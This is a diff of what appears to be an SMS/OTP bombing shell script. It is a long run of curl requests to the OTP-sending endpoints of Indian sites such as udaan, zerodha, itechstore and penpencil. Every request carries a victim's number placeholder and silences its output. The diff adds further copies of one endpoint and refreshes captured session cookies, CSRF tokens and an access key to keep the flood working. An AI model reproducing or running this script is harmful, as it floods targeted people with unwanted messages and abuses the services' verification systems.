@@ -1,4 +1,24 @@
 
+curl 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2' \
+  -H 'authority: auth.udaan.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-IN' \
+  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \
+  -H 'cookie: _ga=GA1.2.1228709418.1684610575; sid=/UqFHtm5HmcBANcpJSRRuB5nzq6JzFtCTZ2JwSov6UZS2aRE1KMuhv6osRJahmxiRATUxxHqluYFGRX3OeeJbRkI; _gid=GA1.2.249963436.1684768987; _gat_gtag_UA_180706540_1=1; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A1883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24device_id%22%3A%20%221883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D' \
+  -H 'origin: https://auth.udaan.com' \
+  -H 'referer: https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'traceparent: 00-3c90f21610eda0843c36fbbde42436fb-30adfdd4b4969d92-00' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
+  -H 'x-app-id: udaan-auth' \
+  --data-raw 'mobile=€tor' \
+  --compressed > /dev/null 2>&1
+  
 curl 'https://www.adanione.com/api/Identity/api/v2/AuthenticateApiv2/SendOtp?ref=web' \
   -H 'authority: www.adanione.com' \
   -H 'accept: */*' \
@@ -114,18 +134,18 @@ curl 'https://itechstore.co.in/wp-admin/admin-ajax.php' \
   -H 'accept: */*' \
   -H 'accept-language: en-US,en;q=0.9' \
   -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
-  -H 'cookie: digits_countrycode=91; pys_session_limit=true; pys_start_session=true; _gcl_au=1.1.1400105741.1684251994; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://itechstore.co.in/; last_pysTrafficSource=direct; last_pys_landing_page=https://itechstore.co.in/; _ga=GA1.3.2075979944.1684251996; _gid=GA1.3.1894452663.1684251996; _fbp=fb.2.1684251996064.496068802; __cf_bm=6X5B4GUndCp8HwC6KAPhWJJ_B5Y0VnYZS77JLWZPKFU-1684252176-0-AbIwvUtVidA2HHpYVgYcqiVONsLXiUItzYgQqptWlJ5VlKx3Hg6X6aVzgl5KVVdB6EfXtki1wzy7HLWfx4F3GPkax5mGGGUx4hCoByHW9gGI; cf_clearance=M_1HMoeVh3RqaU537vavp0BdudJuypkx9PvR_8Vywl8-1684252186-0-160; PHPSESSID=nqsf2pb43khgb1oeppk1hq9l61' \
+  -H 'cookie: _gcl_au=1.1.1400105741.1684251994; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://itechstore.co.in/; last_pys_landing_page=https://itechstore.co.in/; _ga=GA1.3.2075979944.1684251996; _fbp=fb.2.1684251996064.496068802; digits_countrycode=91; pys_session_limit=true; pys_start_session=true; last_pysTrafficSource=google.com; _gid=GA1.3.328880913.1684768088; __cf_bm=TgRBj824a8V8zyqUS7f0tAJ_ziRS1eulZvOWgSpvxDo-1684768275-0-ARu5GSgSUv9xUEHRxyfwSkcTMeGVxlDCwujKP1RoH+Q6XHxm1TrS5W7Sxed38sTLIT1ucmi5l8ZFk6powVBt/2swUL+TWzmZDLeF6AM8u63w; cf_clearance=mtlu7eSteJtgJiJGp9EVArM8oPTICx.1N4ZOPJQuQsc-1684768286-0-160; PHPSESSID=8s0rfjkslanc9ont4lb1690ck1' \
   -H 'origin: https://itechstore.co.in' \
   -H 'referer: https://itechstore.co.in/?login=true&page=1&redirect_to=https%3A%2F%2Fitechstore.co.in%2F' \
-  -H 'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   -H 'sec-fetch-dest: empty' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
-  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
   -H 'x-requested-with: XMLHttpRequest' \
-  --data-raw 'action=digits_check_mob&countrycode=%2B91&mobileNo=€tor&csrf=650f3ec4c5&login=2&username=&email=ncbsbvd%40gmail.com&captcha=&captcha_ses=&digits=1&json=1&whatsapp=1&digits_reg_name=ndbsbf&digregcode=%2B91&digits_reg_mail=99902+12085&digregscode2=%2B91&mobmail2=+ncbsbvd%40gmail.com&dig_otp=&code=&dig_reg_mail=ncbsbvd%40gmail.com&dig_nounce=650f3ec4c5' \
+  --data-raw 'action=digits_check_mob&countrycode=%2B91&mobileNo=€tor&csrf=a58117e6d4&login=2&username=&email=nddbfj%40gmail.com&captcha=&captcha_ses=&digits=1&json=1&whatsapp=1&digits_reg_name=mnfnf&digregcode=%2B91&digits_reg_mail=99902+12085&digregscode2=%2B91&mobmail2=nddbfj%40gmail.com&dig_otp=&code=&dig_reg_mail=nddbfj%40gmail.com&dig_nounce=a58117e6d4' \
   --compressed > /dev/null 2>&1
 
 curl 'https://gql.meatigo.com/?queryName=resendOTP' \
@@ -181,7 +201,26 @@ curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
   --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
   --compressed > /dev/null 2>&1
 
-
+curl 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2' \
+  -H 'authority: auth.udaan.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-IN' \
+  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \
+  -H 'cookie: _ga=GA1.2.1228709418.1684610575; sid=/UqFHtm5HmcBANcpJSRRuB5nzq6JzFtCTZ2JwSov6UZS2aRE1KMuhv6osRJahmxiRATUxxHqluYFGRX3OeeJbRkI; _gid=GA1.2.249963436.1684768987; _gat_gtag_UA_180706540_1=1; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A1883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24device_id%22%3A%20%221883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D' \
+  -H 'origin: https://auth.udaan.com' \
+  -H 'referer: https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'traceparent: 00-3c90f21610eda0843c36fbbde42436fb-30adfdd4b4969d92-00' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
+  -H 'x-app-id: udaan-auth' \
+  --data-raw 'mobile=€tor' \
+  --compressed > /dev/null 2>&1
+  
 curl 'https://signup.zerodha.com/api/user/resend/otp/whatsapp/' \
   -H 'authority: signup.zerodha.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -373,18 +412,18 @@ curl 'https://itechstore.co.in/wp-admin/admin-ajax.php' \
   -H 'accept: */*' \
   -H 'accept-language: en-US,en;q=0.9' \
   -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
-  -H 'cookie: digits_countrycode=91; pys_session_limit=true; pys_start_session=true; _gcl_au=1.1.1400105741.1684251994; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://itechstore.co.in/; last_pysTrafficSource=direct; last_pys_landing_page=https://itechstore.co.in/; _ga=GA1.3.2075979944.1684251996; _gid=GA1.3.1894452663.1684251996; _fbp=fb.2.1684251996064.496068802; __cf_bm=6X5B4GUndCp8HwC6KAPhWJJ_B5Y0VnYZS77JLWZPKFU-1684252176-0-AbIwvUtVidA2HHpYVgYcqiVONsLXiUItzYgQqptWlJ5VlKx3Hg6X6aVzgl5KVVdB6EfXtki1wzy7HLWfx4F3GPkax5mGGGUx4hCoByHW9gGI; cf_clearance=M_1HMoeVh3RqaU537vavp0BdudJuypkx9PvR_8Vywl8-1684252186-0-160; PHPSESSID=nqsf2pb43khgb1oeppk1hq9l61' \
+  -H 'cookie: _gcl_au=1.1.1400105741.1684251994; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://itechstore.co.in/; last_pys_landing_page=https://itechstore.co.in/; _ga=GA1.3.2075979944.1684251996; _fbp=fb.2.1684251996064.496068802; digits_countrycode=91; pys_session_limit=true; pys_start_session=true; last_pysTrafficSource=google.com; _gid=GA1.3.328880913.1684768088; __cf_bm=TgRBj824a8V8zyqUS7f0tAJ_ziRS1eulZvOWgSpvxDo-1684768275-0-ARu5GSgSUv9xUEHRxyfwSkcTMeGVxlDCwujKP1RoH+Q6XHxm1TrS5W7Sxed38sTLIT1ucmi5l8ZFk6powVBt/2swUL+TWzmZDLeF6AM8u63w; cf_clearance=mtlu7eSteJtgJiJGp9EVArM8oPTICx.1N4ZOPJQuQsc-1684768286-0-160; PHPSESSID=8s0rfjkslanc9ont4lb1690ck1' \
   -H 'origin: https://itechstore.co.in' \
   -H 'referer: https://itechstore.co.in/?login=true&page=1&redirect_to=https%3A%2F%2Fitechstore.co.in%2F' \
-  -H 'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   -H 'sec-fetch-dest: empty' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
-  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
   -H 'x-requested-with: XMLHttpRequest' \
-  --data-raw 'action=digits_check_mob&countrycode=%2B91&mobileNo=€tor&csrf=650f3ec4c5&login=2&username=&email=ncbsbvd%40gmail.com&captcha=&captcha_ses=&digits=1&json=1&whatsapp=1&digits_reg_name=ndbsbf&digregcode=%2B91&digits_reg_mail=99902+12085&digregscode2=%2B91&mobmail2=+ncbsbvd%40gmail.com&dig_otp=&code=&dig_reg_mail=ncbsbvd%40gmail.com&dig_nounce=650f3ec4c5' \
+  --data-raw 'action=digits_check_mob&countrycode=%2B91&mobileNo=€tor&csrf=a58117e6d4&login=2&username=&email=nddbfj%40gmail.com&captcha=&captcha_ses=&digits=1&json=1&whatsapp=1&digits_reg_name=mnfnf&digregcode=%2B91&digits_reg_mail=99902+12085&digregscode2=%2B91&mobmail2=nddbfj%40gmail.com&dig_otp=&code=&dig_reg_mail=nddbfj%40gmail.com&dig_nounce=a58117e6d4' \
   --compressed > /dev/null 2>&1
 
 curl 'https://gql.meatigo.com/?queryName=resendOTP' \
@@ -458,6 +497,26 @@ curl 'https://signup.zerodha.com/api/user/resend/otp/whatsapp/' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
   -H 'x-access-key: 399FCBF92243426CA508A5AE512F9E6F' \
   --data-raw '{"mobile":"€tor"}' \
+  --compressed > /dev/null 2>&1
+  
+  curl 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2' \
+  -H 'authority: auth.udaan.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-IN' \
+  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \
+  -H 'cookie: _ga=GA1.2.1228709418.1684610575; sid=/UqFHtm5HmcBANcpJSRRuB5nzq6JzFtCTZ2JwSov6UZS2aRE1KMuhv6osRJahmxiRATUxxHqluYFGRX3OeeJbRkI; _gid=GA1.2.249963436.1684768987; _gat_gtag_UA_180706540_1=1; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A1883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24device_id%22%3A%20%221883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D' \
+  -H 'origin: https://auth.udaan.com' \
+  -H 'referer: https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'traceparent: 00-3c90f21610eda0843c36fbbde42436fb-30adfdd4b4969d92-00' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
+  -H 'x-app-id: udaan-auth' \
+  --data-raw 'mobile=€tor' \
   --compressed > /dev/null 2>&1
 
 curl 'https://api.spinny.com/api/c/user/otp-request/' \
@@ -632,18 +691,18 @@ curl 'https://itechstore.co.in/wp-admin/admin-ajax.php' \
   -H 'accept: */*' \
   -H 'accept-language: en-US,en;q=0.9' \
   -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
-  -H 'cookie: digits_countrycode=91; pys_session_limit=true; pys_start_session=true; _gcl_au=1.1.1400105741.1684251994; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://itechstore.co.in/; last_pysTrafficSource=direct; last_pys_landing_page=https://itechstore.co.in/; _ga=GA1.3.2075979944.1684251996; _gid=GA1.3.1894452663.1684251996; _fbp=fb.2.1684251996064.496068802; __cf_bm=6X5B4GUndCp8HwC6KAPhWJJ_B5Y0VnYZS77JLWZPKFU-1684252176-0-AbIwvUtVidA2HHpYVgYcqiVONsLXiUItzYgQqptWlJ5VlKx3Hg6X6aVzgl5KVVdB6EfXtki1wzy7HLWfx4F3GPkax5mGGGUx4hCoByHW9gGI; cf_clearance=M_1HMoeVh3RqaU537vavp0BdudJuypkx9PvR_8Vywl8-1684252186-0-160; PHPSESSID=nqsf2pb43khgb1oeppk1hq9l61' \
+  -H 'cookie: _gcl_au=1.1.1400105741.1684251994; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://itechstore.co.in/; last_pys_landing_page=https://itechstore.co.in/; _ga=GA1.3.2075979944.1684251996; _fbp=fb.2.1684251996064.496068802; digits_countrycode=91; pys_session_limit=true; pys_start_session=true; last_pysTrafficSource=google.com; _gid=GA1.3.328880913.1684768088; __cf_bm=TgRBj824a8V8zyqUS7f0tAJ_ziRS1eulZvOWgSpvxDo-1684768275-0-ARu5GSgSUv9xUEHRxyfwSkcTMeGVxlDCwujKP1RoH+Q6XHxm1TrS5W7Sxed38sTLIT1ucmi5l8ZFk6powVBt/2swUL+TWzmZDLeF6AM8u63w; cf_clearance=mtlu7eSteJtgJiJGp9EVArM8oPTICx.1N4ZOPJQuQsc-1684768286-0-160; PHPSESSID=8s0rfjkslanc9ont4lb1690ck1' \
   -H 'origin: https://itechstore.co.in' \
   -H 'referer: https://itechstore.co.in/?login=true&page=1&redirect_to=https%3A%2F%2Fitechstore.co.in%2F' \
-  -H 'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   -H 'sec-fetch-dest: empty' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
-  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
   -H 'x-requested-with: XMLHttpRequest' \
-  --data-raw 'action=digits_check_mob&countrycode=%2B91&mobileNo=€tor&csrf=650f3ec4c5&login=2&username=&email=ncbsbvd%40gmail.com&captcha=&captcha_ses=&digits=1&json=1&whatsapp=1&digits_reg_name=ndbsbf&digregcode=%2B91&digits_reg_mail=99902+12085&digregscode2=%2B91&mobmail2=+ncbsbvd%40gmail.com&dig_otp=&code=&dig_reg_mail=ncbsbvd%40gmail.com&dig_nounce=650f3ec4c5' \
+  --data-raw 'action=digits_check_mob&countrycode=%2B91&mobileNo=€tor&csrf=a58117e6d4&login=2&username=&email=nddbfj%40gmail.com&captcha=&captcha_ses=&digits=1&json=1&whatsapp=1&digits_reg_name=mnfnf&digregcode=%2B91&digits_reg_mail=99902+12085&digregscode2=%2B91&mobmail2=nddbfj%40gmail.com&dig_otp=&code=&dig_reg_mail=nddbfj%40gmail.com&dig_nounce=a58117e6d4' \
   --compressed > /dev/null 2>&1
 
 curl 'https://gql.meatigo.com/?queryName=resendOTP' \
@@ -699,6 +758,25 @@ curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
   --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
   --compressed > /dev/null 2>&1
 
+curl 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2' \
+  -H 'authority: auth.udaan.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-IN' \
+  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \
+  -H 'cookie: _ga=GA1.2.1228709418.1684610575; sid=/UqFHtm5HmcBANcpJSRRuB5nzq6JzFtCTZ2JwSov6UZS2aRE1KMuhv6osRJahmxiRATUxxHqluYFGRX3OeeJbRkI; _gid=GA1.2.249963436.1684768987; _gat_gtag_UA_180706540_1=1; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A1883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24device_id%22%3A%20%221883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D' \
+  -H 'origin: https://auth.udaan.com' \
+  -H 'referer: https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'traceparent: 00-3c90f21610eda0843c36fbbde42436fb-30adfdd4b4969d92-00' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
+  -H 'x-app-id: udaan-auth' \
+  --data-raw 'mobile=€tor' \
+  --compressed > /dev/null 2>&1
 
 curl 'https://signup.zerodha.com/api/user/resend/otp/whatsapp/' \
   -H 'authority: signup.zerodha.com' \
@@ -773,4 +851,24 @@ curl 'https://core.functionup.org/lead/register' \
   -H 'source: functionup-website' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","lastName":"hjdhjgbhsjb","firstName":"hjbvhvbdh","program":"web-development","whatsAppConsent":true}' \
+  --compressed > /dev/null 2>&1
+  
+  curl 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2' \
+  -H 'authority: auth.udaan.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-IN' \
+  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \
+  -H 'cookie: _ga=GA1.2.1228709418.1684610575; sid=/UqFHtm5HmcBANcpJSRRuB5nzq6JzFtCTZ2JwSov6UZS2aRE1KMuhv6osRJahmxiRATUxxHqluYFGRX3OeeJbRkI; _gid=GA1.2.249963436.1684768987; _gat_gtag_UA_180706540_1=1; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A1883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24device_id%22%3A%20%221883a9d6a9b2352-0043f56849db66-26031a51-144000-1883a9d6a9b2353%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D' \
+  -H 'origin: https://auth.udaan.com' \
+  -H 'referer: https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'traceparent: 00-3c90f21610eda0843c36fbbde42436fb-30adfdd4b4969d92-00' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
+  -H 'x-app-id: udaan-auth' \
+  --data-raw 'mobile=€tor' \
   --compressed > /dev/null 2>&1
